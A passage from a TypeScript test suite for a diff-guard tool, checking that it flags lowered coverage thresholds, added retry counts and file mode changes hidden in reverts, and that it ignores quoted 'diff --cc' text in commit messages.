    expect(diffGuardProblems(config).join("\n")).toContain("drops the `lines` coverage threshold from 90 to 10");
  });

  it("reads a quoted threshold key", () => {
    const config = [
      "diff --git a/vitest.config.ts b/vitest.config.ts",
      "--- a/vitest.config.ts",
      "+++ b/vitest.config.ts",
      "@@ -1,4 +1,4 @@",
      '-        "lines": 90,',
      '+        "lines": 10,',
      "",
    ].join("\n");
    expect(diffGuardProblems(config).join("\n")).toContain("drops the `lines` coverage threshold from 90 to 10");
  });

  it("counts the call form of a retry count", () => {
    expect(judge(["+    this.retries(3);"])[0]).toContain("adds a retry count");
  });

  it("does not let a mode change ride along inside an exact revert", () => {
    const body = ["diff --git a/src/lib/x.ts b/src/lib/x.ts", "--- a/src/lib/x.ts", "+++ b/src/lib/x.ts", "@@ -1,2 +1,2 @@", " keep", "-old", "+new", ""];
    const revert = body.join("\n");
    const chmod = [body[0] as string, "old mode 100644", "new mode 100755", ...body.slice(1)].join("\n");
    expect(diffGuardProblems(revert, { revert })).toEqual([]);
    expect(diffGuardProblems(chmod, { revert }).length).toBeGreaterThan(0);
  });

  it("does not mistake a commit message quoting `diff --cc` for a word diff", () => {
    const show = [
      "commit abc123",
      "",
      "    diff --cc inputs are now refused.",
      "",
      "diff --git a/src/a.test.ts b/src/a.test.ts",
      "--- a/src/a.test.ts",
      "+++ b/src/a.test.ts",
      "@@ -1 +1 @@",
      "-  const a = scanned.rows;",
      "+  const a = scanned.all;",
      "",
    ].join("\n");
    expect(diffGuardProblems(show)).toEqual([]);
  });
});
